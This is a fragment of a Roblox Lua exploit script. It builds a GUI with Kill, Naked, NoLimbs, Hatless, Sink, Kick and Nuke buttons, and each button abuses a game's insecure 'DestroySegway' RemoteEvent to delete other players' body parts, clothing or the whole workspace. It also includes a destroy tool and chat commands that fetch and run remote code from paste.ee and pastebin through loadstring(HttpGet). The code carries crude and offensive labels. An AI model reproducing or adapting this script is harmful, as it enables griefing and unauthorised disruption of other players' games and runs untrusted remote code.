naked.Size = UDim2.new(0, 134, 0, 40)
naked.Font = Enum.Font.SourceSansLight
naked.Text = "Naked"
naked.TextColor3 = Color3.new(1, 1, 1)
naked.TextSize = 23

credits.Name = "credits"
credits.Parent = top
credits.BackgroundColor3 = Color3.new(1, 1, 1)
credits.BackgroundTransparency = 1
credits.Position = UDim2.new(0, 0, 1, 0)
credits.Size = UDim2.new(0, 291, 0, 23)
credits.Font = Enum.Font.SourceSansLight
credits.Text = "Commands/Scripts by Dong , UI by Unverified"
credits.TextColor3 = Color3.new(1, 1, 1)
credits.TextSize = 17
credits.TextWrapped = true

hatless.Name = "hatless"
hatless.Parent = top
hatless.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
hatless.BackgroundTransparency = 0.5
hatless.BorderSizePixel = 0
hatless.Position = UDim2.new(0.0206185561, 0, 5.39550591, 0)
hatless.Size = UDim2.new(0, 134, 0, 40)
hatless.Font = Enum.Font.SourceSansLight
hatless.Text = "Hatless"
hatless.TextColor3 = Color3.new(1, 1, 1)
hatless.TextSize = 23

sink.Name = "sink"
sink.Parent = top
sink.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
sink.BackgroundTransparency = 0.5
sink.BorderSizePixel = 0
sink.Position = UDim2.new(0.525773168, 0, 5.39550591, 0)
sink.Size = UDim2.new(0, 131, 0, 40)
sink.Font = Enum.Font.SourceSansLight
sink.Text = "Sink"
sink.TextColor3 = Color3.new(1, 1, 1)
sink.TextSize = 23

nuke.Name = "nuke"
nuke.Parent = top
nuke.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
nuke.BackgroundTransparency = 0.5
nuke.BorderSizePixel = 0
nuke.Position = UDim2.new(0.525773168, 0, 7.1955061, 0)
nuke.Size = UDim2.new(0, 131, 0, 40)
nuke.Font = Enum.Font.SourceSansLight
nuke.Text = "Nuke"
nuke.TextColor3 = Color3.new(1, 1, 1)
nuke.TextSize = 23

kick.Name = "kick"
kick.Parent = top
kick.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
kick.BackgroundTransparency = 0.5
kick.BorderSizePixel = 0
kick.Position = UDim2.new(0.0206185561, 0, 7.1955061, 0)
kick.Size = UDim2.new(0, 134, 0, 40)
kick.Font = Enum.Font.SourceSansLight
kick.Text = "Kick"
kick.TextColor3 = Color3.new(1, 1, 1)
kick.TextSize = 23

target.Name = "target"
target.Parent = top
target.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
target.BackgroundTransparency = 0.40000000596046
target.Position = UDim2.new(0.0206185561, 0, 8.86666584, 0)
target.Size = UDim2.new(0, 278, 0, 33)
target.Font = Enum.Font.SourceSans
target.Text = ""
target.TextColor3 = Color3.new(1, 1, 1)
target.TextSize = 23

queue.Name = "queue"
queue.Parent = top
queue.BackgroundColor3 = Color3.new(1, 1, 1)
queue.BackgroundTransparency = 1
queue.Position = UDim2.new(0.15463917, 0, 10.0333328, 0)
queue.Size = UDim2.new(0, 201, 0, 23)
queue.Font = Enum.Font.SourceSans
queue.Text = "Replication Queue: 0"
queue.TextColor3 = Color3.new(1, 0, 0.0156863)
queue.TextSize = 20
queue.TextWrapped = true

nolimbs.Name = "nolimbs"
nolimbs.Parent = top
nolimbs.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
nolimbs.BackgroundTransparency = 0.5
nolimbs.BorderSizePixel = 0
nolimbs.Position = UDim2.new(0.525773168, 0, 3.56217265, 0)
nolimbs.Size = UDim2.new(0, 131, 0, 40)
nolimbs.Font = Enum.Font.SourceSansLight
nolimbs.Text = "NoLimbs"
nolimbs.TextColor3 = Color3.new(1, 1, 1)
nolimbs.TextSize = 23

-- SLAVE'S WORK --

for i,slaves in pairs(game:GetDescendants()) do
    if slaves.Name == "DestroySegway" then
        print("no u")   
    
kill.MouseButton1Down:connect(function()
if string.lower(target.Text) == "all" then
	for i,c in pairs(game.Players:GetPlayers()) do
 		ohok = c.Character["Head"]
        slaves:FireServer(ohok, {Value = ohok})
	end	
	else
if game.Players:FindFirstChild(target.Text) then
if game.Players:FindFirstChild(target.Text).Character then
	slaves:FireServer(game.Players:FindFirstChild(target.Text).Character.Head, {Value = game.Players:FindFirstChild(target.Text).Character.Head}) else
		print("nibba who this")
	
end
	
	
end

end
end)

btools.MouseButton1Down:connect(function()
	local Tool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
local Equipped = false

Tool.RequiresHandle = false
Tool.Name = "Destroy Tool"
local Field = Instance.new("SelectionBox",game.Workspace)
local Mouse = game.Players.LocalPlayer:GetMouse()
Field.LineThickness = 0.1

Tool.Equipped:connect(function()
Equipped = true

while Equipped == true do
if Mouse.Target ~= nil then
Field.Adornee = Mouse.Target

else
Field.Adornee = nil
end
wait()
end
end)


Tool.Unequipped:connect(function()
Equipped = false
Field.Adornee = nil
end)

Tool.Activated:connect(function()
if Mouse.Target ~= nil then
slaves:FireServer(Mouse.Target, {Value = Mouse.Target})	
local AttemptTarget = Mouse.Target
while AttemptTarget ~= nil do
AttemptTarget.Velocity = Vector3.new(0,-1000000000000000,0)
AttemptTarget.CanCollide = false
wait()
end

end
end)
end)

naked.MouseButton1Down:connect(function()
	if string.lower(target.Text) == "all" then
		for i,c in pairs(game.Players:GetPlayers()) do
    ohok = c.Character.Shirt
    ohoka = c.Character.Pants
    slaves:FireServer(ohok, {Value = ohok})
    slaves:FireServer(ohoka, {Value = ohoka})
		end
	else
		slaves:FireServer(game.Players:FindFirstChild(target.Text).Character.Shirt, {Value = game.Players:FindFirstChild(target.Text).Character.Shirt})
		slaves:FireServer(game.Players:FindFirstChild(target.Text).Character.Pants, {Value = game.Players:FindFirstChild(target.Text).Character.Pants})
end
end)

nolimbs.MouseButton1Down:connect(function()
	if string.lower(target.Text) == "all" then
		for i,c in pairs(game.Players:GetPlayers()) do
    ohok = c.Character["Right Arm"]
    ohoka = c.Character["Left Arm"]
    ohokb = c.Character["Right Leg"]
    ohokc = c.Character["Left Leg"]
        slaves:FireServer(ohok, {Value = ohok})
	slaves:FireServer(ohoka, {Value = ohoka})
        slaves:FireServer(ohokb, {Value = ohokb})
	slaves:FireServer(ohokc, {Value = ohokc})
		end
	else
		slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Right Arm"], {Value = game.Players:FindFirstChild(target.Text).Character["Right Arm"]})
		slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Right Leg"], {Value = game.Players:FindFirstChild(target.Text).Character["Right Leg"]})
		slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Left Arm"], {Value = game.Players:FindFirstChild(target.Text).Character["Left Arm"]})
		slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Left Leg"], {Value = game.Players:FindFirstChild(target.Text).Character["Left Leg"]})
	end
end)

hatless.MouseButton1Down:connect(function()
	if string.lower(target.Text) == "all" then
		for i,x in pairs(game.Players:GetPlayers()) do
    for i,c in pairs(x.Character:GetChildren()) do
    if c:IsA("Accessory") then
    ohok = c
    slaves:FireServer(ohok, {Value = ohok})
   
end
end
end
	else
		for i, hats in pairs(game.Players:FindFirstChild(target.Text).Character:GetChildren()) do
			if hats:IsA("Accessory") then
				slaves:FireServer(hats, {Value = hats })
			end
		end
end
end)

sink.MouseButton1Down:connect(function()
	if string.lower(target.Text) == "all" then
		for i,c in pairs(game.Players:GetPlayers()) do
    ohok = c.Character.HumanoidRootPart
    slaves:FireServer(ohok, {Value = ohok})
		end
	else
		slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["HumanoidRootPart"], {Value = game.Players:FindFirstChild(target.Text).Character["HumanoidRootPart"]})
end
end)

kick.MouseButton1Down:connect(function()
	if string.lower(target.Text) == "all" then
		for i,c in pairs(game.Players:GetPlayers()) do
    ohok = c
        slaves:FireServer(ohok, {Value = ohok})
		end
	else
		slaves:FireServer(game.Players:FindFirstChild(target.Text), {Value = game.Players:FindFirstChild(target.Text)})
	end
end)

nuke.MouseButton1Down:connect(function()
	for i,c in pairs(game.Workspace:GetChildren()) do
    ohok = c
        slaves:FireServer(ohok, {Value = ohok})
end
end)

end
end
elseif cht:match(">nullware") then
    loadstring(game:HttpGet("https://paste.ee/r/lGZMc/0"))()
elseif cht:match(">cmds") then
    loadstring(game:HttpGet("https://pastebin.com/raw/gmEkaVtC",true))()
end
end)
